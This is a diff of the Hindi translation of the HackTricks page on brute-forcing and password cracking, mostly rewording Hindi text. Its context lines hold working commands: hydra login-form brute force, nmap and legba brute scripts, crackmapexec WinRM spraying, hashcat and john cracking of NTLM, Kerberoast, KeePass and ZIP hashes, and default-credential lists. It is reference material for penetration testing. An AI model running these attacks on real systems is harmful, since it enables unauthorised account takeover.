@@ -17,7 +17,7 @@ GCP हैकिंग सीखें और अभ्यास करें: <
 <summary>HackTricks का समर्थन करें</summary>
 
 * [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
-* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर हमें फॉलो करें।**
+* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **Twitter** पर हमें **फॉलो** करें** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।**
 
 </details>
@@ -25,7 +25,7 @@ GCP हैकिंग सीखें और अभ्यास करें: <
 
 ## Default Credentials
 
-**प्रौद्योगिकी के लिए डिफ़ॉल्ट क्रेडेंशियल्स** के लिए गूगल में खोजें, या **इन लिंक्स को आजमाएं**:
+**जिस तकनीक का उपयोग किया जा रहा है, उसके डिफ़ॉल्ट क्रेडेंशियल्स के लिए गूगल में खोजें**, या **इन लिंक्स को आजमाएं**:
 
 * [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 * [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -67,7 +67,7 @@ python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-एक शब्द सूची जनरेटर उपकरण, जो आपको शब्दों का एक सेट प्रदान करने की अनुमति देता है, जिससे आपको दिए गए शब्दों से कई भिन्नताएँ बनाने की संभावना मिलती है, एक अद्वितीय और आदर्श शब्द सूची बनाने के लिए जिसका उपयोग एक विशिष्ट लक्ष्य के संबंध में किया जा सके।
+एक वर्डलिस्ट जनरेटर टूल, जो आपको शब्दों का एक सेट प्रदान करने की अनुमति देता है, जिससे आपको दिए गए शब्दों से कई भिन्नताएँ बनाने की संभावना मिलती है, एक अद्वितीय और आदर्श वर्डलिस्ट बनाने के लिए जिसका उपयोग एक विशिष्ट लक्ष्य के संबंध में किया जा सके।
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -104,7 +104,7 @@ Finished in 0.920s.
 <figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) का उपयोग करें ताकि आप दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित **कार्यप्रवाहों** को आसानी से बना और **स्वचालित** कर सकें।\
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) का उपयोग करें ताकि आप दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित **स्वचालित कार्यप्रवाह** आसानी से बना सकें।\
 आज ही एक्सेस प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
@@ -178,9 +178,9 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-For http**s** आपको "http-post-form" से "**https-post-form" में बदलना होगा
+For http**s** you have to change from "http-post-form" to "**https-post-form"**
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla या (D)rupal या (M)oodle
+### **HTTP - CMS --** (W)र्डप्रेस, (J)ूमला या (D)्रुपल या (M)ूडल
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
@@ -196,7 +196,7 @@ legba imap --username user --password data/passwords.txt --target localhost:993
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
-### ISCSI
+### आईएससीएसआई
 ```bash
 nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
 ```
@@ -300,7 +300,7 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-**oracle\_login** का उपयोग करने के लिए **patator** के साथ आपको **स्थापित** करने की आवश्यकता है:
+**oracle\_login** का उपयोग करने के लिए **patator** के साथ आपको **स्थापित** करना होगा:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
@@ -479,7 +479,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ### ऑनलाइन क्रैकिंग डेटाबेस
 
 * [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 के साथ/बिना ESS/SSP और किसी भी चुनौती के मान के साथ)
+* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 ESS/SSP के साथ/बिना और किसी भी चुनौती के मान के साथ)
 * [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (हैश, WPA2 कैप्चर, और MSOffice, ZIP, PDF... के आर्काइव)
 * [https://crackstation.net/](https://crackstation.net) (हैश)
 * [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
@@ -490,7 +490,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 * [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 * [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-हैश को ब्रूट फोर्स करने से पहले इसे देखें।
+हैश को ब्रूट फोर्स करने की कोशिश करने से पहले इसे देखें।
 
 ### ZIP
 ```bash
@@ -510,7 +510,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### ज्ञात स्पष्ट पाठ ज़िप हमला
 
-आपको **एक फ़ाइल के स्पष्ट पाठ** (या स्पष्ट पाठ का एक भाग) **को जानना होगा जो** एन्क्रिप्टेड ज़िप के अंदर है। आप एन्क्रिप्टेड ज़िप के अंदर **फ़ाइलों के नाम और फ़ाइलों के आकार** की जांच कर सकते हैं: **`7z l encrypted.zip`**\
+आपको **संरक्षित ज़िप के अंदर** एक फ़ाइल का **स्पष्ट पाठ** (या स्पष्ट पाठ का एक भाग) जानना आवश्यक है। आप **संरक्षित ज़िप के अंदर शामिल फ़ाइलों के फ़ाइल नाम और आकार** की जांच कर सकते हैं: **`7z l encrypted.zip`**\
 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) को रिलीज़ पृष्ठ से डाउनलोड करें।
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -573,13 +573,13 @@ keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a f
 #The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
-### Keberoasting
+### केबरोस्टिंग
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Lucks image
+### Lucks छवि
 
 #### विधि 1
 
@@ -625,7 +625,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 यदि आपके पास एक xlsx फ़ाइल है जिसमें एक कॉलम पासवर्ड द्वारा सुरक्षित है, तो आप इसे अनलॉक कर सकते हैं:
 
 * **इसे गूगल ड्राइव पर अपलोड करें** और पासवर्ड स्वचालित रूप से हटा दिया जाएगा
-* **हाथ से हटाने के लिए**:
+* **हाथ से** इसे **हटाने के लिए**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -667,13 +667,13 @@ hash-identifier
 
 ### **Wordlist Generation Tools**
 
-* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** उन्नत कीबोर्ड-वॉक जनरेटर जिसमें कॉन्फ़िगर करने योग्य बेस कैरेक्टर्स, कीमैप और रूट्स होते हैं।
+* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** उन्नत कीबोर्ड-वॉक जनरेटर जिसमें कॉन्फ़िगर करने योग्य बेस कैरेक्टर, कीमैप और रूट होते हैं।
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
 ### John mutation
 
-_**/etc/john/john.conf**_ पढ़ें और इसे कॉन्फ़िगर करें
+_**/etc/john/john.conf**_ को पढ़ें और इसे कॉन्फ़िगर करें
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
@@ -742,7 +742,7 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 # Mask numbers will be prepended to each word in the wordlist
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
-#### Hashcat मोड
+#### Hashcat मोड्स
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
@@ -777,7 +777,7 @@ GCP हैकिंग सीखें और अभ्यास करें: <
 <summary>HackTricks का समर्थन करें</summary>
 
 * [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
-* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो करें** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमारा अनुसरण करें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PRs सबमिट करें।
 
 </details>
